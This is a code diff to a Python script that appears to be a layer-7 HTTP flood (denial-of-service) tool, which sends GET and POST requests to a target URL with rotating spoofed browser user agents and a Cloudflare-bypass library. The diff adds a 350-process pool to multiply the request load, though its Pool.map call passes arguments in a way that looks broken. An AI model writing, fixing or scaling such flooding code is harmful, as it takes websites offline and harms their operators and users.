@@ -2,6 +2,7 @@ import cloudscraper, requests, httpx, threading, fake_useragent, random, sys
 import os
 from sys import *
 from fake_useragent import UserAgent
+from multiprocessing import Pool
 global user_agents
 user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
@@ -162,6 +163,8 @@ def __main__():
                 with meltodown(url, headers=header, timeout=30) as scrap:
                     try:
                         scrap.get()
+                    except Exception as e:
+                        print(e)
                     except:
                         pass
             else:
@@ -198,6 +201,8 @@ def __main__():
                 with meltodown(url, headers=header, timeout=30, data=data) as scrap:
                     try:
                         scrap.post(data=data)
+                    except Exception as e:
+                        print(e)
                     except:
                         pass
             else:
@@ -212,7 +217,8 @@ def __main__():
         url, threads, t, select, pr_path, method = layer7_target()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
-        __I__(url, threads, select, pr_path, method)
+        with Pool(350) as mp:
+            mp.map(__I__, url, threads, select, pr_path, method)
         timer.join()
 if __name__ == '__main__':
     clear()
